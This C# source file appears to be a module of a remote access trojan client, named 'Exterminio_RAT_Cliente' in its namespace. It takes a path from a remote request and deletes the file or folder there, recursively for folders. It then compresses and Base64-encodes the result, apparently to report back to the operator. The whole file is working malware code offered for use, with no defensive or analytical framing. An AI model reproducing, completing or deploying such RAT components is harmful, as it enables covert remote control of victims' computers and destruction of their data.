using System;
using System.IO;
using System.Text;
using System.Threading;

namespace Exterminio_RAT_Cliente
{
    public class DeleteResponse
    {
        public string Estado { get; set; } // "completado", "fallido"
        public string Mensaje { get; set; }
        public string RutaArchivo { get; set; }
        public bool ExisteDespues { get; set; } // Para segunda verificación

        public string ConvertirAString()
        {
            return $"{Estado}|{Mensaje}|{RutaArchivo}|{ExisteDespues}";
        }

        public string ComprimirYCodificar()
        {
            try
            {
                // Convertir a string
                string informacion = ConvertirAString();
                
                // Comprimir con Deflate
                byte[] datosOriginales = Encoding.UTF8.GetBytes(informacion);
                byte[] datosComprimidos;
                
                using (System.IO.MemoryStream outputStream = new System.IO.MemoryStream())
                {
                    using (System.IO.Compression.DeflateStream deflateStream = new System.IO.Compression.DeflateStream(outputStream, System.IO.Compression.CompressionMode.Compress))
                    {
                        deflateStream.Write(datosOriginales, 0, datosOriginales.Length);
                    }
                    datosComprimidos = outputStream.ToArray();
                }
                
                // Convertir a Base64
                string base64String = Convert.ToBase64String(datosComprimidos);
                
                return base64String;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en compresión y codificación: {ex.Message}");
                return "";
            }
        }
    }

    public static class DeleteRequestProcessor
    {
        private static readonly Mutex deleteMutex = new Mutex(false, "DeleteMutex");

        public static DeleteResponse ProcesarSolicitudBorrado(string rutaArchivo)
        {
            try
            {
                Console.WriteLine($"🗑️ Procesando solicitud de borrado: {rutaArchivo}");
                
                // Usar mutex para asegurar que solo un proceso de borrado corra a la vez
                if (!deleteMutex.WaitOne(TimeSpan.FromSeconds(30)))
                {
                    return new DeleteResponse
                    {
                        Estado = "fallido",
                        Mensaje = "Timeout esperando mutex de borrado",
                        RutaArchivo = rutaArchivo,
                        ExisteDespues = true
                    };
                }

                try
                {
                    // PRIMERA VERIFICACIÓN: Verificar si el archivo o carpeta existe
                    bool existeAntes = File.Exists(rutaArchivo) || Directory.Exists(rutaArchivo);
                    
                    if (!existeAntes)
                    {
                        return new DeleteResponse
                        {
                            Estado = "fallido",
                            Mensaje = "Archivo o carpeta no existe",
                            RutaArchivo = rutaArchivo,
                            ExisteDespues = false
                        };
                    }

                    Console.WriteLine($"🗑️ Elemento encontrado, procediendo a borrar: {rutaArchivo}");

                    // PROCEDER CON EL BORRADO
                    bool borradoExitoso = false;
                    string mensaje = "";

                    try
                    {
                        if (File.Exists(rutaArchivo))
                        {
                            // Es un archivo
                            File.Delete(rutaArchivo);
                            borradoExitoso = true;
                            mensaje = "Archivo eliminado exitosamente";
                        }
                        else if (Directory.Exists(rutaArchivo))
                        {
                            // Es una carpeta
                            Directory.Delete(rutaArchivo, true); // true = recursivo
                            borradoExitoso = true;
                            mensaje = "Carpeta eliminada exitosamente";
                        }
                    }
                    catch (Exception ex)
                    {
                        borradoExitoso = false;
                        mensaje = $"Error durante el borrado: {ex.Message}";
                        Console.WriteLine($"❌ Error borrando elemento: {ex.Message}");
                    }

                    // SEGUNDA VERIFICACIÓN: Verificar si ya no existe
                    bool existeDespues = File.Exists(rutaArchivo) || Directory.Exists(rutaArchivo);

                    if (borradoExitoso && !existeDespues)
                    {
                        return new DeleteResponse
                        {
                            Estado = "completado",
                            Mensaje = mensaje,
                            RutaArchivo = rutaArchivo,
                            ExisteDespues = false
                        };
                    }
                    else if (borradoExitoso && existeDespues)
                    {
                        return new DeleteResponse
                        {
                            Estado = "fallido",
                            Mensaje = "Elemento eliminado pero aún existe (verificación fallida)",
                            RutaArchivo = rutaArchivo,
                            ExisteDespues = true
                        };
                    }
                    else
                    {
                        return new DeleteResponse
                        {
                            Estado = "fallido",
                            Mensaje = mensaje,
                            RutaArchivo = rutaArchivo,
                            ExisteDespues = existeDespues
                        };
                    }
                }
                finally
                {
                    // Liberar el mutex
                    deleteMutex.ReleaseMutex();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando solicitud de borrado: {ex.Message}");
                return new DeleteResponse
                {
                    Estado = "fallido",
                    Mensaje = $"Error: {ex.Message}",
                    RutaArchivo = rutaArchivo,
                    ExisteDespues = true
                };
            }
        }
    }
}
